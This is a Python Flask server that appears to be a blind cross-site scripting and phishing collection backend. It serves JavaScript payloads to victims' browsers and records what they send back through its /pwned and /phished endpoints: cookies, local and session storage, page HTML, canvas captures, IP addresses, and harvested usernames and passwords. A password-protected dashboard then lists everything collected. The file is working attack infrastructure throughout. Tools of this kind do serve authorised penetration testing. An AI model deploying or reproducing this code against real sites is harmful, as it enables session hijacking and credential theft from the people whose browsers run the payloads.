from contextlib import contextmanager
from flask import Flask, request, send_file, jsonify, render_template
from flask_cors import CORS
from flask_basicauth import BasicAuth
from datetime import datetime
from io import BytesIO
import os
import psycopg2
import psycopg2.extras
import config

DATABASE_URL = os.environ['DATABASE_URL']

@contextmanager
def get_db():
	try: 
		conn = psycopg2.connect(DATABASE_URL, sslmode='require')
		yield conn 
	finally: 
		conn.close()


@contextmanager
def get_cursor(commit=False): 
	with get_db() as conn:
		cur = conn.cursor(cursor_factory = psycopg2.extras.RealDictCursor)
		try: 
			yield cur 
			if commit: 
				conn.commit() 
		finally: 
			cur.close()


def setup_db():
	with get_cursor(commit=True) as cur:
		try:
			cur.execute("""create table triggers(
			id SERIAL PRIMARY KEY,
			cookies varchar,
			url varchar,
			localStorage varchar,
			sessionStorage varchar,
			html varchar,
			canvas varchar,
			useragent varchar,
			IP varchar,
			time timestamp,
			extra varchar,
			username varchar,
			password varchar
			);""")
		except:
			pass


app = Flask(__name__)
CORS(app)

app.config['BASIC_AUTH_USERNAME'] = config.AUTH_USERNAME
app.config['BASIC_AUTH_PASSWORD'] = config.AUTH_PASSWORD
basic_auth = BasicAuth(app)

setup_db()	


@app.route('/')
def home():
	with open('payload.js', 'r') as f:
		payload = f.read()
	payload += 'letsgo("' + config.DOMAIN + '", "' + request.query_string.decode() + '");'
	return send_file(BytesIO(payload.encode()), mimetype='application/javascript')


@app.route('/phish')
def phish():
	with open('phish.js', 'r') as f:
		payload = f.read()
	payload += 'go_phish("' + config.DOMAIN + '");'
	return send_file(BytesIO(payload.encode()), mimetype='application/javascript')


@app.route('/pwned', methods=['POST'])
def pwned():
	data = request.json
	data["useragent"] = request.headers.get('User-Agent')
	data["IP"] = request.remote_addr
	data["time"] = datetime.now()
	with get_cursor(commit=True) as cur:
		cur.execute("INSERT INTO triggers (cookies,url,localStorage,sessionStorage,html,canvas,useragent,IP,time,extra) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s)", (data["cookies"], data["url"], data["localStorage"], data["sessionStorage"], data["html"], data["canvas"], data["useragent"], data["IP"], data["time"], data["extra"]))
	return 'ok'


@app.route('/phished', methods=['POST'])
def phished():
	data = request.json
	data["IP"] = request.remote_addr
	data["time"] = datetime.now()
	with get_cursor(commit=True) as cur:
		cur.execute("INSERT INTO triggers (url,IP,time,username,password) VALUES (%s, %s, %s, %s, %s)", (data["url"], data["IP"], data["time"], data["user"], data["pass"]))
	return 'ok'


@app.route('/triggers')
@basic_auth.required
def get_triggers():
	with get_cursor() as cur:
		cur.execute("SELECT * FROM triggers order by time desc")
		triggers = cur.fetchall()
	return jsonify(triggers)


@app.route('/triggers/<id>', methods=['DELETE'])
@basic_auth.required
def delete_trigger(id):
	with get_cursor(commit=True) as cur:
		cur.execute("DELETE FROM triggers WHERE ID = %s", (id,))
	return 'ok'


@app.route('/dashboard')
@basic_auth.required
def triggers_view():
	return render_template('dashboard.html')


if __name__ == '__main__':
	app.run(debug=True)
